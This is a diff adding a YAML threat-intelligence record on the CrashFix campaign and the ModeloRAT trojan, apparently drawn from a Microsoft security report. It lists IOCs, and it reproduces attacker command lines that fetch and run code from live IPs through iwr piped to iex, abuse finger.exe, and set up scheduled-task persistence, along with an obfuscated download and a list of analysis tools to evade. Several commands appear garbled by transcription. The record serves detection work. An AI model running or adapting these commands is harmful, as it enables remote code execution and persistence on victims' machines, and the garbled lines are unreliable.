@@ -1,0 +1,80 @@
+description: CrashFix campaign uses malicious browser extension to install and execute
+  payloads, leveraging native utilities like finger.exe for exfiltration and persistence.
+malware_families:
+- ModeloRAT
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - pythonw.exe
+  - nltest.exe
+  - whoami.exe
+  - net.exe
+  commandline:
+  - cmd.exe /c start "" /min cmd /c "copy C:\\WINDOWS\\system32\\finger.exe %temp%\\ct.exe & %temp%\\ct.exe confirm@199.217.98.108"
+  - pythonw.exe -ArgumentList "%appdata%\\WPy64-31401\\python\\modes.py"
+  - iwr -Uri http://69.67.173.38/n -Method POST -Body @{messge = "ABCDII"} -ContentType application/x-www-form-urlencoded -UseBasicParsing | iex
+  - iwr -Uri http://69.67.173.30/n -Method POST -Body @{messge = "BCDA222"} -ContentType application/x-www-form-urlencoded -UseBasicParsing | iex
+  - 'iwr -Uri https://www.dropbox.com/scl/fi/znygol7goezlkhnwazcil/al.zip?rlkey=3wgjBepr28mxsskovisngeosc&st=ftkaww3skdl=1 -OutFile $env:appdata\Winpython.zip; Expand-Archive -Path "$env:appdata\Winpython.zip" -DestinationPath "$env:appdata; rm "$env:appdata\Winpython.zip"; Start-Process -FilePath["$env: appdata\WPy64-31401\pythan\pythonw.exe -ArgumentList "$env:appdata\WPy64-31481\python\modes.py"'
+  - iwr -Uri https://www.dropbox.com/scURivc3puanxBee 7stu7S 1Ko/ rprikey=iwk2jvoh2ahbaalvehysBlbfdast=comecwex&di=1-OutFile \"$env:appdatalWPy64-31401\pythonvextentions. py\"; 1s \"$env:appdata\WPy64-31401\pythany\"; Start-Process~FllePath \"$env:appdata\WPy64-3140T\python\pythoniw.exe\" -ArgumentList \"Senv:app data\\WPyed-31401Wpythorextentions. py"
+  - iwr -Uri http://144.31.221.197/final1e -OutFile $downloadPath -ErrorAction Stop | Out-Null; Expand-Archive -Path $downloadPath -DestinationPath $etractPath -Force -ErrorAction Stop | Out-Null; Remove-Item -Path $downloadPath -Force -ErrorAction Stop | Out-Null; schtasks /create /tn "$taskName /tr $taskCommand /sc minute /mo 5 /F | out-Null; schtasks /run /tn "$taskName"
+  powershell:
+  - Invoke-WebRequest -Uri $(-Join("http://69.67,173,30/3".ToCharArray() | %{$c=[int][char]$_;if($c-gt=65-and$c-lt=91){[char](65+((($c-65+18)%26)))}elseif($c-gt=97-and$c-lt=123){[char](97+(($c-97+18)%26))}else{ [char]$c}})) -Outfile ([System.IO.Path]::Combine([Environment]::GetFolderPath($(-Join("Local".ToCharArray() | %{$c=[int][char]$_;if($c-gt=65-and$c-lt=91){[char](65+((($c-65+25)%26)))}elseif($c-gt=97-and$c-lt=123){[char](97+(($c-97+15)%26))}else{[char]$c}}))), $(-Join("script.ps1".ToCharArray() | %{$c=[int][char]$_;if($c-gt=65-and$c-lt=91){[char](65+((($c-65+17)%26)))}elseif($c-gt=97-and$c-lt=123){[char](97+(($c-97+17)%26))}else{[char]$c}}))))
+  - $m = @("wireshark", "processhacker", "fiddler", "procexp","procmon", "id", "x32dbg","x64dbg", "ollydbg", "chatengine,scyll, "scyllx6e, "scyll x86", "inmunitydebugger","windbg", "reshacker", "reshackar32", "reshackerss", "hxd", "ghide", "lordpe","tcpview","metmon", "sniffer", "snort", "pimonitor", "rdre2", "prodiscover", "sysinternals","netlimiter", "sandboxie", "vmware", "virtualbox", "vmtools", "VBoxService", "VBoxTry","qemu-g", "prl_cc"); Get-Process | ForEach-Object { $processname = $_.Name.ToLower();foreach ($tool in $m) { if ($processname -like "*$tool*") { Write-Host exit }}; $systemInfo = systeminfo | findstr /C:"Domain:"; $domain = $systemInfo -replace".*Domain:\\s*", ""; if ($domain -eq "WORKGROUP") { iwr -Uri "http://69.67.173.38/n"-Method POST -Body @{message = "ABCDII"} | iex } else { iwr -Uri "http://69.67.173.30/n"-Method POST -Body @{message = "BCDA222"} | iex }; (Get-CimInstance -Namespaceroot/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandPropertyDisplayname | Out-string)
+  - iwr -Uri http://69.67.173.38/n -Method POST -Body @{messge = "ABCDII"} -ContentTypeapplication/x-www-form-urlencoded -UseBasicParsing | iex
+  - iwr -Uri http://69.67.173.30/n -Method POST -Body @{messge = "BCDA222"} -ContentTypeapplication/x-www-form-urlencoded -UseBasicParsing | iex
+  - 'iwr -Uri https://www.dropbox.com/scl/fi/znygol7goezlkhnwazcil/al.zip?rlkey=3wgjBepr28mxsskovisngeosc&st=ftkaww3skdl=1 -OutFile $env:appdata\Winpython.zip; Expand-Archive -Path "$env:appdata\Winpython.zip" -DestinationPath "$env:appdata; rm "$env:appdata\Winpython.zip"; Start-Process -FilePath["$env: appdata\WPy64-31401\pythan\pythonw.exe -ArgumentList "$env:appdata\WPy64-31481\python\modes.py"'
+  - iwr -Uri https://www.dropbox.com/scURivc3puanxBee 7stu7S 1Ko/ rprikey=iwk2jvoh2ahbaalvehysBlbfdast=comecwex&di=1-OutFile \"$env:appdatalWPy64-31401\pythonvextentions. py\"; 1s \"$env:appdata\WPy64-31401\pythany\";Start-Process~FllePath \"$env:appdata\WPy64-3140T\python\pythoniw.exe\" -ArgumentList \"Senv:app data\\WPyed-31401Wpythorextentions. py"
+  - iwr -Uri http://144.31.221.197/final1e -OutFile $downloadPath -ErrorAction Stop | Out-Null; Expand-Archive -Path $downloadPath -DestinationPath $etractPath -Force -ErrorAction Stop | Out-Null; Remove-Item -Path $downloadPath -Force -ErrorAction Stop | Out-Null; schtasks /create /tn "$taskName /tr $taskCommand /sc minute /mo 5 /F | out-Null; schtasks /run /tn "$taskName"
+  registry_keys:
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load: []
+  network_connections:
+  - ct.exe, 199.217.98.108, 80
+  - pythonw.exe, 158.247.252.178, 80
+  - pythonw.exe, 170.168.103.208, 80
+  file_activity:
+  - C:\\Users\\PII\\AppData\\Local\\Temp\\ct.exe
+  - '%appdata%\\Winpython.zip'
+  - '%appdata%\\WPy64-31401\\python\\modes.py'
+  - '%appdata%\\udp.pyw'
+  - C:\Users\<username>\AppData\Winpython.zip
+  - C:\Users\<username>\AppData\WPy64-31401\pythan\pythonw.exe
+  - C:\Users\<username>\AppData\WPy64-31401\python\modes.py
+  - C:\Users\<username>\AppData\Microsoft\Windows\Softwareprotectionplatform\archive.zip
+  - C:\Users\<username>\AppData\Microsoft\Windows\Softwareprotectionplatform\udp.pyw
+  - C:\Users\<username>\AppData\Microsoft\Windows\Softwareprotectionplatform\run.ee
+  persistence:
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, pythonw.exe -ArgumentList
+    "%appdata%\\WPy64-31401\\python\\modes.py"
+  - Scheduled task named SoftwareProtection
+  - schtasks /create /tn "$taskName" /tr $taskCommand /sc minute /mo 5 /F | out-Null;
+    schtasks /run /tn "$taskName"
+  process_relations: []
+IOCs:
+  hashes:
+  - c76c0146407069fd4c271d6e1e03448c481f0970ddbe7042b31f552e37b55817
+  - c46af9ae6ab0e7567573dbc950a8ffbe30ea848fac90cd15860045fe7640199c
+  ip_addresses:
+  - 199.217.98.108
+  - 69.67.173.30
+  - 144.31.221.197
+  - 158.247.252.178
+  - 170.168.103.208
+  - 69.67.173.38
+  domains:
+  - nexsnield.com
+  - dropbox.com
+  urls:
+  - https://clients2.googleusercontent.com/crx/blobs/AdNiCiWgWaD8B4kV4BOi-xHAdl_xFwiwSmP8QmSc6A6E1zgoIEADAFK6BjirJRdrSZzhbF76CD2kGkCiVsyp7dbwdjMX-0r9Oa823TLI9zd6DKnBwQJ3J_98pRk8vPDsYoHiAMZSmuXxBj8-Ca_j38phC9wy0r6JCZeZXw/CPCDKMJDDOCIKJDKBBEIAAFNPDBDAFMI_2025_1116_1842_0.crx
+  - https://www.dropbox.com/scl/fi/znygol7goezlkhnwazcil/a1.zip
+  - http://69.67.173.38/n
+  - http://69.67.173.30/n
+  - https://www.dropbox.com/scl/fi/znygol7goezlkhnwazcil/al.zip?rlkey=3wgjBepr28mxsskovisngeosc&st=ftkaww3skdl=1
+  - http://144.31.221.197/final1e
+authors:
+- Sai Chakri Kandalai
+- Kaustubh Mangalwedhekar
+reference: https://www.microsoft.com/en-us/security/blog/2026/02/05/clickfix-variant-crashfix-deploying-python-rat-trojan
+date_of_publication: February 05, 2026
+file_creation_date: February 08, 2026
